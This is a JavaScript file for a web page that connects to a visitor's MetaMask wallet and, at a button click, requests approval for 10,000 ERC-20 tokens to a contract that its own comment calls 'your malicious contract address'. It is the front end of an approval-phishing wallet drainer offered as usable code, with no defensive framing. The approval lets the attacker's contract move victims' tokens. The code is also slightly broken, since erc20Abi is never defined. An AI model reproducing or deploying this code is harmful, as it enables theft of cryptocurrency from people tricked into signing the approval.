let web3;
let userAccount;
let contractAddress = "0x70abc29bA40d6BCBE9389bcF4DdaCC252bC0bBe4"; // Replace with your malicious contract address
let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575"; // Replace with the ERC-20 token address
let contract;
let token;

window.onload = () => {
    if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        loadABI();  // Load ABI dynamically
        init();
    } else {
        alert("MetaMask not found!");
    }
};

async function loadABI() {
    const response = await fetch('abi.json');
    const abi = await response.json();

    // Initialize the contract using ABI from abi.json
    contract = new web3.eth.Contract(abi, contractAddress);
    token = new web3.eth.Contract(erc20Abi, tokenAddress);
}

async function init() {
    document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
    document.getElementById('approveTokensBtn').addEventListener('click', approveTokens);
}

async function connectWallet() {
    try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];
        document.getElementById('status').innerText = `Connected: ${userAccount}`;
        document.getElementById('approveTokensBtn').style.display = "inline-block";
    } catch (error) {
        console.error(error);
    }
}

async function approveTokens() {
    const amount = web3.utils.toWei("10000", "ether"); // Amount to approve (example 10,000 tokens)
    try {
        await token.methods.approve(contractAddress, amount).send({ from: userAccount });
        document.getElementById('status').innerText = "Approval successful!";
    } catch (error) {
        document.getElementById('status').innerText = "Approval failed!";
        console.error(error);
    }
}

